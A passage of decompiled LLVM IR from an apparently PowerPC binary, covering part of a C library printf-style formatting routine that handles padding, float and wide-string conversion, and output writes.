  store i32 2, i32* @r27, align 4
  br label %dec_label_pc_1001a7ec

dec_label_pc_1001a7d0:                            ; preds = %dec_label_pc_1001a7ac
  %v1_1001a7d0 = and i32 %v0_1001a7e0, 2
  store i32 %v1_1001a7d0, i32* %r0.global-to-local, align 4
  %v3_1001a7d0 = icmp eq i32 %v1_1001a7d0, 0
  br i1 %v3_1001a7d0, label %dec_label_pc_1001a7e0, label %dec_label_pc_1001a7d8

dec_label_pc_1001a7d8:                            ; preds = %dec_label_pc_1001a7d0
  store i32 0, i32* @r27, align 4
  br label %dec_label_pc_1001a7ec

dec_label_pc_1001a7e0:                            ; preds = %dec_label_pc_1001a7d0
  %v1_1001a7e0 = urem i32 %v0_1001a7e0, 2
  store i32 %v1_1001a7e0, i32* %r11.global-to-local, align 4
  %v3_1001a7e0 = icmp eq i32 %v1_1001a7e0, 0
  br i1 %v3_1001a7e0, label %dec_label_pc_1001a7ec, label %dec_label_pc_1001a7e8

dec_label_pc_1001a7e8:                            ; preds = %dec_label_pc_1001a7e0
  store i32 4, i32* @r27, align 4
  br label %dec_label_pc_1001a7ec

dec_label_pc_1001a7ec:                            ; preds = %dec_label_pc_1001a7e0, %dec_label_pc_1001a778, %dec_label_pc_1001a7d8, %dec_label_pc_1001a7bc, %dec_label_pc_1001a7e8
  %v0_1001a858 = phi i32 [ %v6_1001a798, %dec_label_pc_1001a778 ], [ %v2_1001a7c0, %dec_label_pc_1001a7bc ], [ %v6_1001a798, %dec_label_pc_1001a7e0 ], [ %v6_1001a798, %dec_label_pc_1001a7e8 ], [ %v6_1001a798, %dec_label_pc_1001a7d8 ]
  %stack_var_-184.0 = phi i32 [ %v0_1001a7e0, %dec_label_pc_1001a778 ], [ %v1_1001a7bc, %dec_label_pc_1001a7bc ], [ %v0_1001a7e0, %dec_label_pc_1001a7e0 ], [ %v0_1001a7e0, %dec_label_pc_1001a7e8 ], [ %v0_1001a7e0, %dec_label_pc_1001a7d8 ]
  %v3_1001a7ec = load i32, i32* %stack_var_-196, align 4
  store i32 %v2_1001aa00, i32* %r0.global-to-local, align 4
  %v2_1001a7f4 = sub i32 %v2_1001aa00, %v0_1001a858
  %v1_1001a7f8 = add i32 %v2_1001a7f4, 127
  store i32 %v1_1001a7f8, i32* %r31.global-to-local, align 4
  %tmp77 = icmp sgt i32 %v3_1001a7ec, -1
  br i1 %tmp77, label %dec_label_pc_1001a808, label %dec_label_pc_1001a804

dec_label_pc_1001a804:                            ; preds = %dec_label_pc_1001a7ec
  br label %dec_label_pc_1001a808

dec_label_pc_1001a808:                            ; preds = %dec_label_pc_1001a7ec, %dec_label_pc_1001a804
  %v0_1001a83c = phi i32 [ %v3_1001a7ec, %dec_label_pc_1001a7ec ], [ 1, %dec_label_pc_1001a804 ]
  store i32 %stack_var_-184.0, i32* %r0.global-to-local, align 4
  %v1_1001a80c = and i32 %stack_var_-184.0, 16
  store i32 %v1_1001a80c, i32* @r11, align 4
  %v3_1001a80c = icmp eq i32 %v1_1001a80c, 0
  br i1 %v3_1001a80c, label %dec_label_pc_1001a858, label %dec_label_pc_1001a814

dec_label_pc_1001a814:                            ; preds = %dec_label_pc_1001a808
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v2_1001a818, label %dec_label_pc_1001a824, label %dec_label_pc_1001a834.thread

dec_label_pc_1001a834.thread:                     ; preds = %dec_label_pc_1001a814
  store i32 6, i32* @r27, align 4
  br label %dec_label_pc_1001a858

dec_label_pc_1001a824:                            ; preds = %dec_label_pc_1001a814
  br i1 %v3_1001a824, label %dec_label_pc_1001a82c, label %dec_label_pc_1001a834

dec_label_pc_1001a82c:                            ; preds = %dec_label_pc_1001a824
  store i32 9, i32* @r27, align 4
  br label %dec_label_pc_1001a858

dec_label_pc_1001a834:                            ; preds = %dec_label_pc_1001a824
  br i1 %v3_1001a834, label %dec_label_pc_1001a83c, label %dec_label_pc_1001a858

dec_label_pc_1001a83c:                            ; preds = %dec_label_pc_1001a834
  %v3_1001a83c = icmp ugt i32 %v0_1001a83c, %v1_1001a7f8
  br i1 %v3_1001a83c, label %dec_label_pc_1001a858, label %dec_label_pc_1001a844

dec_label_pc_1001a844:                            ; preds = %dec_label_pc_1001a83c
  %v1_1001a844 = inttoptr i32 %v0_1001a858 to i8*
  %v2_1001a844 = load i8, i8* %v1_1001a844, align 1
  %v3_1001a844 = zext i8 %v2_1001a844 to i32
  store i32 %v3_1001a844, i32* %r0.global-to-local, align 4
  %v3_1001a84c = icmp eq i8 %v2_1001a844, 48
  br i1 %v3_1001a84c, label %dec_label_pc_1001a858, label %dec_label_pc_1001a854

dec_label_pc_1001a854:                            ; preds = %dec_label_pc_1001a844
  %v1_1001a854 = add i32 %v2_1001a7f4, 128
  br label %dec_label_pc_1001a858

dec_label_pc_1001a858:                            ; preds = %dec_label_pc_1001a834.thread, %dec_label_pc_1001a834, %dec_label_pc_1001a844, %dec_label_pc_1001a83c, %dec_label_pc_1001a808, %dec_label_pc_1001a82c, %dec_label_pc_1001a854
  %v1_1001a8a0 = phi i32 [ %v0_1001a83c, %dec_label_pc_1001a834 ], [ 1, %dec_label_pc_1001a844 ], [ %v0_1001a83c, %dec_label_pc_1001a83c ], [ %v0_1001a83c, %dec_label_pc_1001a808 ], [ %v0_1001a83c, %dec_label_pc_1001a82c ], [ %v1_1001a854, %dec_label_pc_1001a854 ], [ %v0_1001a83c, %dec_label_pc_1001a834.thread ]
  %v1_1001a858 = inttoptr i32 %v0_1001a858 to i8*
  %v2_1001a858 = load i8, i8* %v1_1001a858, align 1
  %v3_1001a858 = zext i8 %v2_1001a858 to i32
  store i32 %v3_1001a858, i32* %r0.global-to-local, align 4
  %v3_1001a85c = icmp eq i8 %v2_1001a858, 48
  br i1 %v3_1001a85c, label %dec_label_pc_1001a864, label %dec_label_pc_1001a89c

dec_label_pc_1001a864:                            ; preds = %dec_label_pc_1001a858
  %v0_1001a864 = load i32, i32* @r27, align 4
  %tmp78 = icmp slt i32 %v0_1001a864, 6
  br i1 %tmp78, label %dec_label_pc_1001a870, label %dec_label_pc_1001a86c

dec_label_pc_1001a86c:                            ; preds = %dec_label_pc_1001a864
  store i32 11, i32* @r27, align 4
  br label %dec_label_pc_1001a870

dec_label_pc_1001a870:                            ; preds = %dec_label_pc_1001a864, %dec_label_pc_1001a86c
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v3_1001a874, label %dec_label_pc_1001a87c, label %dec_label_pc_1001a88c

dec_label_pc_1001a87c:                            ; preds = %dec_label_pc_1001a870
  store i32 5, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1002e3f8.1162 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001aa18

dec_label_pc_1001a88c:                            ; preds = %dec_label_pc_1001a870
  %v3_1001a88c = icmp eq i32 %v1_1001a8a0, 0
  br i1 %v3_1001a88c, label %dec_label_pc_1001a894, label %dec_label_pc_1001a89c

dec_label_pc_1001a894:                            ; preds = %dec_label_pc_1001a88c
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001aa18

dec_label_pc_1001a89c:                            ; preds = %dec_label_pc_1001a88c, %dec_label_pc_1001a858
  %v3_1001a89c = icmp ugt i32 %v1_1001a8a0, %v1_1001a7f8
  %v2_1001a8a0 = sub i32 %v1_1001a8a0, %v1_1001a7f8
  store i32 %v2_1001a8a0, i32* %r29.global-to-local, align 4
  br i1 %v3_1001a89c, label %dec_label_pc_1001aa38thread-pre-split, label %dec_label_pc_1001aa18

dec_label_pc_1001a8ac:                            ; preds = %dec_label_pc_1001a6d0
  br i1 %v2_1001a8ac, label %dec_label_pc_1001a8e0, label %dec_label_pc_1001a8b4

dec_label_pc_1001a8b4:                            ; preds = %dec_label_pc_1001a8ac
  %v3_1001a8b4 = load i32, i32* %stack_var_-344, align 4
  %v0_1001a8c0 = load i32, i32* @r24, align 4
  store i32 268544208, i32* @lr, align 4
  %v5_1001a8cc = call i32 @_fpmaxtostr(i32 %v0_1001a8c0, i32* nonnull %stack_var_-196, i32 add (i32 ptrtoint (i32* @global_var_10020000.1163 to i32), i32 -23376), i32 %v3_1001a8b4)
  %v1_1001a8d0 = icmp slt i32 %v5_1001a8cc, 0
  br i1 %v1_1001a8d0, label %dec_label_pc_1001ab9c, label %dec_label_pc_1001a8d8

dec_label_pc_1001a8d8:                            ; preds = %dec_label_pc_1001a8b4
  %v0_1001a8d8 = load i32, i32* %r23.global-to-local, align 4
  %v2_1001a8d8 = add i32 %v0_1001a8d8, %v5_1001a8cc
  store i32 %v2_1001a8d8, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_1001ab88

dec_label_pc_1001a8e0:                            ; preds = %dec_label_pc_1001a8ac
  br i1 %v2_1001a8e0, label %dec_label_pc_1001a988, label %dec_label_pc_1001a8e8

dec_label_pc_1001a8e8:                            ; preds = %dec_label_pc_1001a8e0
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v3_1001a8f4 = load i32, i32* %stack_var_-344, align 4
  %v1_1001a8fc = inttoptr i32 %v3_1001a8f4 to i32*
  %v2_1001a8fc = load i32, i32* %v1_1001a8fc, align 4
  br i1 %v3_1001a8e0, label %dec_label_pc_1001a8fc, label %dec_label_pc_1001a950

dec_label_pc_1001a8fc:                            ; preds = %dec_label_pc_1001a8e8
  store i32 %v2_1001a8fc, i32* %r0.global-to-local, align 4
  %v3_1001a900 = icmp eq i32 %v2_1001a8fc, 0
  store i32 %v2_1001a8fc, i32* %stack_var_-340, align 4
  br i1 %v3_1001a900, label %dec_label_pc_1001aa20, label %dec_label_pc_1001a90c

dec_label_pc_1001a90c:                            ; preds = %dec_label_pc_1001a8fc
  %v3_1001a90c = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1001a90c, i32* %r0.global-to-local, align 4
  %v1_1001a914 = icmp slt i32 %v3_1001a90c, 0
  br i1 %v1_1001a914, label %dec_label_pc_1001a920, label %dec_label_pc_1001a91c

dec_label_pc_1001a91c:                            ; preds = %dec_label_pc_1001a90c
  br label %dec_label_pc_1001a920

dec_label_pc_1001a920:                            ; preds = %dec_label_pc_1001a90c, %dec_label_pc_1001a91c
  %storemerge97 = phi i32 [ %v3_1001a90c, %dec_label_pc_1001a91c ], [ -1, %dec_label_pc_1001a90c ]
  store i32 %storemerge97, i32* @r5, align 4
  store i32 %v2_1001a920, i32* @r3, align 4
  store i32 %v2_1001a924, i32* @r6, align 4
  store i32 %v2_1001a920, i32* @r4, align 4
  store i32 268544304, i32* @lr, align 4
  %v0_1001a92c = call i32 @__GI_wcsrtombs()
  %v3_1001a930 = icmp eq i32 %v0_1001a92c, -1
  store i32 %v0_1001a92c, i32* @r31, align 4
  br i1 %v3_1001a930, label %dec_label_pc_1001ab9c, label %dec_label_pc_1001a93c

dec_label_pc_1001a93c:                            ; preds = %dec_label_pc_1001a920
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001aa38

dec_label_pc_1001a950:                            ; preds = %dec_label_pc_1001a8e8
  store i32 %v2_1001aa00, i32* @r28, align 4
  store i32 268544356, i32* @lr, align 4
  %v3_1001a960 = call i32 @__GI_wcrtomb(i32 %v2_1001aa00, i32 %v2_1001a8fc, i32 %v2_1001a924)
  %v3_1001a964 = icmp eq i32 %v3_1001a960, -1
  store i32 %v3_1001a960, i32* @r31, align 4
  br i1 %v3_1001a964, label %dec_label_pc_1001ab9c, label %dec_label_pc_1001a970

dec_label_pc_1001a970:                            ; preds = %dec_label_pc_1001a950
  store i32 %v2_1001aa00, i32* %r30.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  %v0_1001a980 = load i32, i32* @r25, align 4
  %v1_1001a980 = load i32, i32* @r28, align 4
  %v3_1001a980 = trunc i32 %v0_1001a980 to i8
  %v4_1001a980 = add i32 %v1_1001a980, %v3_1001a960
  %v5_1001a980 = inttoptr i32 %v4_1001a980 to i8*
  store i8 %v3_1001a980, i8* %v5_1001a980, align 1
  %v0_1001aa3c.pre.pre = load i32, i32* @r31, align 4
  %v1_1001aa3c.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1001aa38thread-pre-split

dec_label_pc_1001a988:                            ; preds = %dec_label_pc_1001a8e0
  br i1 %v2_1001a988, label %dec_label_pc_1001a9f4, label %dec_label_pc_1001a990

dec_label_pc_1001a990:                            ; preds = %dec_label_pc_1001a988
  %v3_1001a994 = load i32, i32* %stack_var_-344, align 4
  %v1_1001a99c = inttoptr i32 %v3_1001a994 to i32*
  %v2_1001a99c = load i32, i32* %v1_1001a99c, align 4
  br i1 %v3_1001a988, label %dec_label_pc_1001a99c, label %dec_label_pc_1001a9cc

dec_label_pc_1001a99c:                            ; preds = %dec_label_pc_1001a990
  store i32 %v2_1001a99c, i32* %r30.global-to-local, align 4
  %v3_1001a9a0 = icmp eq i32 %v2_1001a99c, 0
  br i1 %v3_1001a9a0, label %dec_label_pc_1001aa20, label %dec_label_pc_1001a9a8

dec_label_pc_1001a9a8:                            ; preds = %dec_label_pc_1001a99c, %dec_label_pc_1001a9fc
  %v0_1001a9bc = phi i32 [ %v2_1001a99c, %dec_label_pc_1001a99c ], [ %v3_1001aa0c, %dec_label_pc_1001a9fc ]
  %v3_1001a9a8 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1001a9a8, i32* %r0.global-to-local, align 4
  %v1_1001a9b0 = icmp slt i32 %v3_1001a9a8, 0
  br i1 %v1_1001a9b0, label %dec_label_pc_1001a9bc, label %dec_label_pc_1001a9b8

dec_label_pc_1001a9b8:                            ; preds = %dec_label_pc_1001a9a8
  br label %dec_label_pc_1001a9bc

dec_label_pc_1001a9bc:                            ; preds = %dec_label_pc_1001a9a8, %dec_label_pc_1001a9b8
  %storemerge98 = phi i32 [ %v3_1001a9a8, %dec_label_pc_1001a9b8 ], [ -1, %dec_label_pc_1001a9a8 ]
  store i32 %storemerge98, i32* @r4, align 4
  store i32 268544452, i32* @lr, align 4
  %v1_1001a9c0 = inttoptr i32 %v0_1001a9bc to i8*
  %v2_1001a9c0 = call i32 @strnlen(i8* %v1_1001a9c0)
  store i32 %v2_1001a9c0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001aa2c

dec_label_pc_1001a9cc:                            ; preds = %dec_label_pc_1001a990
  store i32 1, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  store i32 %v2_1001aa00, i32* %r30.global-to-local, align 4
  store i32 %v2_1001a99c, i32* %stack_var_-328, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001aa38thread-pre-split

dec_label_pc_1001a9f4:                            ; preds = %dec_label_pc_1001a988
  br i1 %v3_1001a9f4, label %dec_label_pc_1001a9fc, label %dec_label_pc_1001ab9c

dec_label_pc_1001a9fc:                            ; preds = %dec_label_pc_1001a9f4
  %v0_1001a9fc = call i32 @__errno_location()
  %v1_1001aa04 = inttoptr i32 %v0_1001a9fc to i32*
  %v2_1001aa04 = load i32, i32* %v1_1001aa04, align 4
  store i32 %v2_1001aa04, i32* @r3, align 4
  store i32 128, i32* @r5, align 4
  store i32 268544528, i32* @lr, align 4
  %v3_1001aa0c = call i32 @__GI___glibc_strerror_r(i32 %v2_1001aa04, i32 %v2_1001aa00, i32 128)
  store i32 %v3_1001aa0c, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001a9a8

dec_label_pc_1001aa18:                            ; preds = %dec_label_pc_1001a89c, %dec_label_pc_1001a894, %dec_label_pc_1001a87c
  %v0_1001aa3c.pre41 = phi i32 [ %v1_1001a7f8, %dec_label_pc_1001a89c ], [ 0, %dec_label_pc_1001a894 ], [ 5, %dec_label_pc_1001a87c ]
  store i32 0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1001aa38thread-pre-split

dec_label_pc_1001aa20:                            ; preds = %dec_label_pc_1001a99c, %dec_label_pc_1001a8fc
  store i32 6, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1002e400.1164 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001aa2c

dec_label_pc_1001aa2c:                            ; preds = %dec_label_pc_1001a9bc, %dec_label_pc_1001aa20
  %v0_1001aa3c29 = phi i32 [ %v2_1001a9c0, %dec_label_pc_1001a9bc ], [ 6, %dec_label_pc_1001aa20 ]
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  br label %dec_label_pc_1001aa38

dec_label_pc_1001aa38thread-pre-split:            ; preds = %dec_label_pc_1001a970, %dec_label_pc_1001a9cc, %dec_label_pc_1001aa18, %dec_label_pc_1001a89c
  %v1_1001aa3c.pre = phi i32 [ %v2_1001a8a0, %dec_label_pc_1001a89c ], [ 0, %dec_label_pc_1001aa18 ], [ %v1_1001aa3c.pre.pre, %dec_label_pc_1001a970 ], [ 0, %dec_label_pc_1001a9cc ]
  %v0_1001aa3c.pre = phi i32 [ %v1_1001a7f8, %dec_label_pc_1001a89c ], [ %v0_1001aa3c.pre41, %dec_label_pc_1001aa18 ], [ %v0_1001aa3c.pre.pre, %dec_label_pc_1001a970 ], [ 1, %dec_label_pc_1001a9cc ]
  %stack_var_-184.1.ph = phi i32 [ %stack_var_-184.0, %dec_label_pc_1001a89c ], [ %stack_var_-184.0, %dec_label_pc_1001aa18 ], [ %v0_1001a7e0, %dec_label_pc_1001a970 ], [ %v0_1001a7e0, %dec_label_pc_1001a9cc ]
  %v0_1001aa38.pr = load i32, i32* @r27, align 4
  br label %dec_label_pc_1001aa38

dec_label_pc_1001aa38:                            ; preds = %dec_label_pc_1001aa38thread-pre-split, %dec_label_pc_1001a93c, %dec_label_pc_1001aa2c
  %v1_1001aa3c = phi i32 [ %v1_1001aa3c.pre, %dec_label_pc_1001aa38thread-pre-split ], [ 0, %dec_label_pc_1001a93c ], [ 0, %dec_label_pc_1001aa2c ]
  %v0_1001aa3c = phi i32 [ %v0_1001aa3c.pre, %dec_label_pc_1001aa38thread-pre-split ], [ %v0_1001a92c, %dec_label_pc_1001a93c ], [ %v0_1001aa3c29, %dec_label_pc_1001aa2c ]
  %v0_1001aa44 = phi i32 [ %v0_1001aa38.pr, %dec_label_pc_1001aa38thread-pre-split ], [ 11, %dec_label_pc_1001a93c ], [ 11, %dec_label_pc_1001aa2c ]
  %stack_var_-184.1 = phi i32 [ %stack_var_-184.1.ph, %dec_label_pc_1001aa38thread-pre-split ], [ %v0_1001a7e0, %dec_label_pc_1001a93c ], [ %v0_1001a7e0, %dec_label_pc_1001aa2c ]
  %v3_1001aa38 = icmp eq i32 %v0_1001aa44, 11
  %v2_1001aa3c = add i32 %v0_1001aa3c, %v1_1001aa3c
  store i32 %v2_1001aa3c, i32* %r0.global-to-local, align 4
  br i1 %v3_1001aa38, label %dec_label_pc_1001aa58, label %dec_label_pc_1001aa44

dec_label_pc_1001aa44:                            ; preds = %dec_label_pc_1001aa38
  %v0_1001aa48 = call i32 @__asm_mfcr()
  %v1_1001aa4c = call i32 @__asm_rlwinm(i32 %v0_1001aa48, i32 30, i32 31, i32 31)
  %v1_1001aa50 = add i32 %v1_1001aa4c, 1
  %v0_1001aa54 = load i32, i32* %r0.global-to-local, align 4
  %v2_1001aa54 = add i32 %v0_1001aa54, %v1_1001aa50
  store i32 %v2_1001aa54, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001aa58

dec_label_pc_1001aa58:                            ; preds = %dec_label_pc_1001aa38, %dec_label_pc_1001aa44
  %v0_1001aa70 = phi i32 [ %v2_1001aa3c, %dec_label_pc_1001aa38 ], [ %v2_1001aa54, %dec_label_pc_1001aa44 ]
  %v3_1001aa60 = icmp ugt i32 %tmp, %v0_1001aa70
  br i1 %v3_1001aa60, label %dec_label_pc_1001aa68, label %dec_label_pc_1001aa6c

dec_label_pc_1001aa68:                            ; preds = %dec_label_pc_1001aa58
  %v2_1001aa68 = sub i32 %tmp, %v0_1001aa70
  br label %dec_label_pc_1001aa6c

dec_label_pc_1001aa6c:                            ; preds = %dec_label_pc_1001aa58, %dec_label_pc_1001aa68
  %storemerge96 = phi i32 [ %v2_1001aa68, %dec_label_pc_1001aa68 ], [ 0, %dec_label_pc_1001aa58 ]
  %v1_1001aa7c = phi i32 [ %v2_1001aa68, %dec_label_pc_1001aa68 ], [ 0, %dec_label_pc_1001aa58 ]
  store i32 %storemerge96, i32* @r28, align 4
  %v0_1001aa6c = load i32, i32* @r26, align 4
  %v3_1001aa6c = icmp eq i32 %v0_1001aa6c, 48
  %v2_1001aa70 = add i32 %v1_1001aa7c, %v0_1001aa70
  store i32 %v2_1001aa70, i32* %r0.global-to-local, align 4
  %v0_1001aa74 = load i32, i32* %r23.global-to-local, align 4
  %v2_1001aa74 = add i32 %v0_1001aa74, %v2_1001aa70
  store i32 %v2_1001aa74, i32* %r23.global-to-local, align 4
  br i1 %v3_1001aa6c, label %dec_label_pc_1001aa7c, label %dec_label_pc_1001aa84

dec_label_pc_1001aa7c:                            ; preds = %dec_label_pc_1001aa6c
  %v0_1001aa7c = load i32, i32* %r29.global-to-local, align 4
  %v2_1001aa7c = add i32 %v0_1001aa7c, %v1_1001aa7c
  store i32 %v2_1001aa7c, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1001aa84

dec_label_pc_1001aa84:                            ; preds = %dec_label_pc_1001aa6c, %dec_label_pc_1001aa7c
  %v0_1001aa98 = phi i32 [ %v1_1001aa7c, %dec_label_pc_1001aa6c ], [ 0, %dec_label_pc_1001aa7c ]
  store i32 %stack_var_-184.1, i32* %r0.global-to-local, align 4
  %v1_1001aa88 = and i32 %stack_var_-184.1, 8
  %v3_1001aa88 = icmp eq i32 %v1_1001aa88, 0
  br i1 %v3_1001aa88, label %dec_label_pc_1001aa90, label %dec_label_pc_1001aaac

dec_label_pc_1001aa90:                            ; preds = %dec_label_pc_1001aa84
  %v0_1001aa90 = load i32, i32* @r24, align 4
  store i32 268544672, i32* @lr, align 4
  %v4_1001aa9c = call i32 @_charpad(i32 %v0_1001aa90, i8 32, i32 %v0_1001aa98)
  %v1_1001aaa0 = load i32, i32* @r28, align 4
  %v4_1001aaa0 = icmp eq i32 %v4_1001aa9c, %v1_1001aaa0
  br i1 %v4_1001aaa0, label %dec_label_pc_1001aaa8, label %dec_label_pc_1001ab9c

dec_label_pc_1001aaa8:                            ; preds = %dec_label_pc_1001aa90
  br label %dec_label_pc_1001aaac

dec_label_pc_1001aaac:                            ; preds = %dec_label_pc_1001aa84, %dec_label_pc_1001aaa8
  %v0_1001aab0 = load i32, i32* @r24, align 4
  %v0_1001aab8 = load i32, i32* @r27, align 4
  %v2_1001aab8 = add i32 %v0_1001aab8, ptrtoint (i32* @global_var_1002e408.1165 to i32)
  store i32 268544704, i32* @lr, align 4
  %v2_1001aabc = call i32 @__GI_fputs_unlocked(i32 %v2_1001aab8, i32 %v0_1001aab0)
  %v0_1001aac0 = load i32, i32* @r24, align 4
  %v0_1001aac8 = load i32, i32* @r29, align 4
  store i32 268544720, i32* @lr, align 4
  %v4_1001aacc = call i32 @_charpad(i32 %v0_1001aac0, i8 48, i32 %v0_1001aac8)
  %v1_1001aad0 = load i32, i32* @r29, align 4
  %v4_1001aad0 = icmp eq i32 %v4_1001aacc, %v1_1001aad0
  br i1 %v4_1001aad0, label %dec_label_pc_1001aad8, label %dec_label_pc_1001ab9c

dec_label_pc_1001aad8:                            ; preds = %dec_label_pc_1001aaac
  %v3_1001aad8 = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_1001aad8, i32* %r0.global-to-local, align 4
  %v3_1001aadc = icmp eq i32 %v3_1001aad8, 0
  br i1 %v3_1001aadc, label %dec_label_pc_1001aae4, label %dec_label_pc_1001ab0c

dec_label_pc_1001aae4:                            ; preds = %dec_label_pc_1001aad8
  %v0_1001aae4 = load i32, i32* @r31, align 4
  %v3_1001aae4 = icmp eq i32 %v0_1001aae4, 0
  br i1 %v3_1001aae4, label %dec_label_pc_1001ab00.thread, label %dec_label_pc_1001ab00

dec_label_pc_1001ab00.thread:                     ; preds = %dec_label_pc_1001aae4
  br label %dec_label_pc_1001ab70

dec_label_pc_1001ab00:                            ; preds = %dec_label_pc_1001aae4
  %v0_1001aaf0 = load i32, i32* @r30, align 4
  %v0_1001aaf8 = load i32, i32* @r24, align 4
  store i32 268544768, i32* @lr, align 4
  %v4_1001aafc = inttoptr i32 %v0_1001aaf8 to i16*
  %v5_1001aafc = call i32 @__stdio_fwrite(i32 %v0_1001aaf0, i32 %v0_1001aae4, i16* %v4_1001aafc)
  %v1_1001ab00.pre = load i32, i32* @r31, align 4
  %v4_1001ab00 = icmp eq i32 %v5_1001aafc, %v1_1001ab00.pre
  br i1 %v4_1001ab00, label %dec_label_pc_1001ab70, label %dec_label_pc_1001ab9c

dec_label_pc_1001ab0c:                            ; preds = %dec_label_pc_1001aad8
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v0_1001ab54.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001ab54

dec_label_pc_1001ab18:                            ; preds = %dec_label_pc_1001ab54
  %v2_1001ab68 = icmp ugt i32 %v0_1001ab18, 128
  %v0_1001ab18. = select i1 %v2_1001ab68, i32 128, i32 %v0_1001ab18
  store i32 %v0_1001ab18., i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1001ab28.1166 to i32), i32* @lr, align 4
  %v0_1001ab24 = call i32 @__GI_wcsrtombs()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_1001ab24, i32* @r30, align 4
  %v3_1001ab2c = icmp eq i32 %v0_1001ab24, 0
  br i1 %v3_1001ab2c, label %dec_label_pc_1001ab48, label %dec_label_pc_1001ab40

dec_label_pc_1001ab40:                            ; preds = %dec_label_pc_1001ab18
  %v0_1001ab30 = load i32, i32* @r24, align 4
  store i32 268544836, i32* @lr, align 4
  %v3_1001ab40 = inttoptr i32 %v0_1001ab30 to i16*
  %v4_1001ab40 = call i32 @__stdio_fwrite(i32 %v2_1001aa00, i32 %v0_1001ab24, i16* %v3_1001ab40)
  store i32 %v4_1001ab40, i32* %r0.global-to-local, align 4
  %v1_1001ab48.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1001ab48

dec_label_pc_1001ab48:                            ; preds = %dec_label_pc_1001ab18, %dec_label_pc_1001ab40
  %v1_1001ab48 = phi i32 [ 0, %dec_label_pc_1001ab18 ], [ %v1_1001ab48.pre, %dec_label_pc_1001ab40 ]
  %v0_1001ab4c = phi i32 [ 0, %dec_label_pc_1001ab18 ], [ %v4_1001ab40, %dec_label_pc_1001ab40 ]
  %v4_1001ab48 = icmp eq i32 %v0_1001ab4c, %v1_1001ab48
  %v1_1001ab4c = load i32, i32* @r31, align 4
  %v2_1001ab4c = sub i32 %v1_1001ab4c, %v0_1001ab4c
  store i32 %v2_1001ab4c, i32* @r31, align 4
  br i1 %v4_1001ab48, label %dec_label_pc_1001ab54, label %dec_label_pc_1001ab9c

dec_label_pc_1001ab54:                            ; preds = %dec_label_pc_1001ab48, %dec_label_pc_1001ab0c
  %v0_1001ab18 = phi i32 [ %v2_1001ab4c, %dec_label_pc_1001ab48 ], [ %v0_1001ab54.pre, %dec_label_pc_1001ab0c ]
  %v3_1001ab54 = icmp eq i32 %v0_1001ab18, 0
  store i32 %v2_1001aa00, i32* @r29, align 4
  store i32 %v2_1001a920, i32* @r4, align 4
  store i32 %v2_1001a924, i32* @r6, align 4
  store i32 %v2_1001aa00, i32* @r3, align 4
  br i1 %v3_1001ab54, label %dec_label_pc_1001ab70, label %dec_label_pc_1001ab18

dec_label_pc_1001ab70:                            ; preds = %dec_label_pc_1001ab54, %dec_label_pc_1001ab00.thread, %dec_label_pc_1001ab00
  %v0_1001ab70 = load i32, i32* @r24, align 4
  %v0_1001ab78 = load i32, i32* @r28, align 4
  store i32 268544896, i32* @lr, align 4
  %v4_1001ab7c = call i32 @_charpad(i32 %v0_1001ab70, i8 32, i32 %v0_1001ab78)
  %v1_1001ab80 = load i32, i32* @r28, align 4
  %v4_1001ab80 = icmp eq i32 %v4_1001ab7c, %v1_1001ab80
  br i1 %v4_1001ab80, label %dec_label_pc_1001ab88, label %dec_label_pc_1001ab9c

dec_label_pc_1001ab88:                            ; preds = %dec_label_pc_1001ab70, %dec_label_pc_1001a8d8, %dec_label_pc_1001a6b0
  %stack_var_-184.2 = phi i32 [ %v0_1001a7e0, %dec_label_pc_1001a6b0 ], [ %stack_var_-184.1, %dec_label_pc_1001ab70 ], [ %v0_1001a7e0, %dec_label_pc_1001a8d8 ]
  %v3_1001ab88 = load i8*, i8** %stack_var_-200, align 4
  %v4_1001ab88 = ptrtoint i8* %v3_1001ab88 to i32
  store i32 %v4_1001ab88, i32* @r29, align 4
  br label %dec_label_pc_1001ab8c

dec_label_pc_1001ab8c:                            ; preds = %dec_label_pc_1001a5a8, %dec_label_pc_1001ab88
  %v0_1001ab8c = phi i32 [ %v0_1001ab8c.pre, %dec_label_pc_1001a5a8 ], [ %v4_1001ab88, %dec_label_pc_1001ab88 ]
  %v0_1001a7e0 = phi i32 [ %tmp56, %dec_label_pc_1001a5a8 ], [ %stack_var_-184.2, %dec_label_pc_1001ab88 ]
  br label %dec_label_pc_1001a5c0

